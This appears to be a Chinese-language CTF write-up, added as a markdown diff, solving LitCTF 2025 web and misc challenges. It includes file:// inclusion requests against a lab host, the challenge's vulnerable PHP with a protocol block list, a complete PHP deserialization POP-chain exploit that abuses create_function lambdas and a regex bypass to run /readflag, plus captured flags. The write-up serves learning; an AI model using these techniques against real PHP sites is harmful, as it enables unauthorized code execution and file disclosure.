@@ -1,0 +1,301 @@
+### LitCTF题目复现
+
+#### 一. web
+
+##### [LitCTF 2025]easy_signin
+
+> 目录扫描+js审计+伪协议+js敏感信息泄露+默认网站目录或MD5爆破？
+
+```
+			loginBtn.addEventListener('click', async () => {
+            const rawPassword = passwordInput.value.trim();
+            if (!rawPassword) {
+                errorTip.textContent = '请输入密码';
+                errorTip.classList.add('show');
+                passwordInput.focus();
+                return;
+            }
+
+            const md5Username = CryptoJS.MD5(rawUsername).toString();   
+            const md5Password = CryptoJS.MD5(rawPassword).toString();   
+
+     
+            const shortMd5User = md5Username.slice(0, 6);  
+            const shortMd5Pass = md5Password.slice(0, 6);  
+
+          
+            const timestamp = Date.now().toString(); //五分钟
+
+       
+            const secretKey = 'easy_signin';  
+            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();
+
+            try {
+                const response = await fetch('login.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Sign': sign  
+                    },
+                    body: new URLSearchParams({
+                        username: md5Username,   
+                        password: md5Password,   
+                        timestamp: timestamp
+                    })
+                });
+
+                const result = await response.json();
+                if (result.code === 200) {
+                    alert('登录成功！');
+                    window.location.href = 'dashboard.php'; 
+                } else {
+                    errorTip.textContent = result.msg;
+                    errorTip.classList.add('show');
+                    passwordInput.value = '';
+                    passwordInput.focus()
+                    setTimeout(() => errorTip.classList.remove('show'), 3000);
+                }
+            } catch (error) {
+                errorTip.textContent = '网络请求失败';
+                errorTip.classList.add('show');
+                setTimeout(() => errorTip.classList.remove('show'), 3000);
+            }
+        });
+```
+
+```javascript
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="api.js"></script>
+```
+
+获得hint:
+
+```
+/api/sys/urlcode.php?url=
+```
+
+直接访问
+
+```
+http://node6.anna.nssctf.cn:22612/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php常用目录
+```
+
+```
+<b>file:///var/www/html/api/sys/urlcode.php 的快照如下：</b><br><br><pre><?php
+error_reporting(0);
+
+function curl($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+$url = $_REQUEST['url'];
+if($url){
+
+    $forbidden_protocols = ['ftp://', 'php://', 'zlib://', 'data://', 'glob://', 'phar://', 'ssh2://', 'rar://', 'ogg://', 'expect://'];
+    $protocol_block = false;
+    foreach ($forbidden_protocols as $proto) {
+        if (strpos($url, $proto) === 0) {  
+            $protocol_block = true;
+            break;
+        }
+    }
+    $log_block = strpos($url, '.log') !== false;  
+    
+    if ($protocol_block) {
+        echo "禁止访问：不允许使用 {$proto} 协议";
+    } elseif ($log_block) {
+        echo "禁止访问：URL 包含 .log";
+    } elseif (strpos($url, 'login.php') !== false || strpos($url, 'dashboard.php') !== false || strpos($url, '327a6c4304ad5938eaf0efb6cc3e53dc.php') !== false) {
+        echo "看不见哦";
+    } else {
+        echo "<b>".$url." 的快照如下：</b><br><br>";
+        echo "<pre>";
+        curl($url);
+        include($url);
+        echo "</pre>";
+    }
+}
+?>
+```
+
+
+
+直接访问327a6c4304ad5938eaf0efb6cc3e53dc.php
+
+得：
+
+``http://node6.anna.nssctf.cn:22612/327a6c4304ad5938eaf0efb6cc3e53dc.php``
+
+```
+NSSCTF{fdb940ca-585a-48db-b336-aa61b988f740}
+```
+
+###### 君の名は
+
+[php反序列化 | 晨曦的个人小站](https://chenxi9981.github.io/php反序列化/)
+
+```
+ <?php
+highlight_file(__FILE__);
+error_reporting(0);
+create_function("", 'die(`/readflag`);');
+class Taki
+{
+    private $musubi;
+    private $magic;
+    public function __unserialize(array $data)
+    {
+        $this->musubi = $data['musubi'];
+        $this->magic = $data['magic'];
+        return ($this->musubi)();
+    }
+    public function __call($func,$args){
+        (new $args[0]($args[1]))->{$this->magic}();
+    }
+}
+
+class Mitsuha
+{
+    private $memory;
+    private $thread;
+    public function __invoke()
+    {
+        return $this->memory.$this->thread;
+    }
+}
+
+class KatawareDoki
+{
+    private $soul;
+    private $kuchikamizake;
+    private $name;
+
+    public function __toString()
+    {
+        ($this->soul)->flag($this->kuchikamizake,$this->name);
+        return "call error!no flag!";
+    }
+}
+
+$Litctf2025 = $_POST['Litctf2025'];
+if(!preg_match("/^[Oa]:[\d]+/i", $Litctf2025)){
+    unserialize($Litctf2025);
+}else{
+    echo "把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
+} 
+```
+
+
+
+反序列化+php匿名函数+lambia表达式爆破
+
+```
+<?php
+
+create_function("", 'die(`/readflag`);');
+class Taki
+{
+    public $musubi;
+    public $magic;
+    public function __unserialize(array $data)
+    {
+        $this->musubi = $data['musubi'];
+        $this->magic = $data['magic'];
+        return ($this->musubi)();
+    }
+    public function __call($func,$args){
+        (new $args[0]($args[1]))->{$this->magic}();
+    }
+}
+
+class Mitsuha
+{
+    public $memory;
+    public $thread;
+    public function __invoke()
+    {
+        return $this->memory.$this->thread;
+    }
+}
+
+class KatawareDoki
+{
+    public $soul;
+    public $kuchikamizake;
+    public $name;
+
+    public function __toString()
+    {
+        ($this->soul)->flag($this->kuchikamizake,$this->name);
+        return "call error!no flag!";
+    }
+}
+
+$a=new Taki();
+$a->musubi=new Mitsuha();
+$a->musubi->memory=new KatawareDoki();
+$a->musubi->memory->kuchikamizake='ReflectionFunction';
+$a->musubi->memory->name="\00lambda_10";
+$a->musubi->memory->soul=new Taki();
+$a->musubi->memory->soul->musubi='time';#目的就是让return ($this->musubi)();这一步不报错，保证程序完整进行,但是我的php环境是8点多，这个代码要在7.2下运行（create_function()函数在PHP 7.2.0版本中已经被废弃），所以我拉了一个7.1的docker环境运行次代码，发现其实不要此行也可以执行
+$a->musubi->memory->soul->magic='invoke';
+
+$aa=new Arrayobject($a);
+$payload=serialize($aa);
+$payload=str_replace("\00","%00",$payload);		
+echo $payload;
+```
+
+这题有个prematch只检测首字母仅需将代码首字母O改为C即可，然后是要用url编码的,同时我们不知道匿名函数是何，但是它是静态的，找到数字爆破即可
+
+![屏幕截图 2025-05-27 190028](D:\360MoveData\Users\zhuji\Pictures\Screenshots\屏幕截图 2025-05-27 190028.png)
+
+###### easy_file
+
+mine绕过+短标签绕过+文件包含+文件上传
+
+首先，登录界面，index.php,首先尝试弱密码爆破，随意输入密码，发现密码发生变化，我们容易知，密码，用户会base64转码，但由于本题提示easy_file可能不会使用强密码，遂爆破，
+
+username输入admin,password输入password
+
+![image-20250527212852888](C:\Users\zhuji\AppData\Roaming\Typora\typora-user-images\image-20250527212852888.png)
+
+进入admin.php,本关让我了解了自动的文件包含如上传文件头像，上传会直接内嵌在网页中的内容，那么控制包含文件的参数呢？一般是file遂payload
+
+![image-20250527213047201](C:\Users\zhuji\AppData\Roaming\Typora\typora-user-images\image-20250527213047201.png)
+
+###### 二.Misc
+
+> (misc友好型比赛x
+
+###### 1.[像素中的航班](https://www.nssctf.cn/problem/6805)
+
+关键：LitCTf,长城杯，南方航空
+
+LitCTF{}
+
+###### 2.[消失的文字](https://www.nssctf.cn/problem/6804)
+
+考点：usb流量分析+压缩包掩码爆破+文本隐写
+
+##### 差生文具+1）
+
+此题可以何之前MinilCTF的流量分析题坐一桌(只不过那题是点相加得到结果，我用ai写的脚本只读了一点导致只有MinilCTF)x
+
+![image-20250527215528400](C:\Users\zhuji\AppData\Roaming\Typora\typora-user-images\image-20250527215528400.png)
+
+翻转图像
+
+![result](C:\Users\zhuji\Downloads\result.png)
+
+结构疑似掩码直接爆破
+
+解压txt之后看到一些特殊字符，但是也有一些规律，f3a084开头与f3a085开头，后面跟一个大于0x80的字符。
+
+写一个脚本，如果0xf3 0xa0之后是0x85，那0x85下一个字节加0xd0，如果是0x84,那0x84下一个字节加0x90，然后把这些字节放到2.txt
+
+LitCTF{39553317-df30-4951-8aad-fcaf3028ca9d}
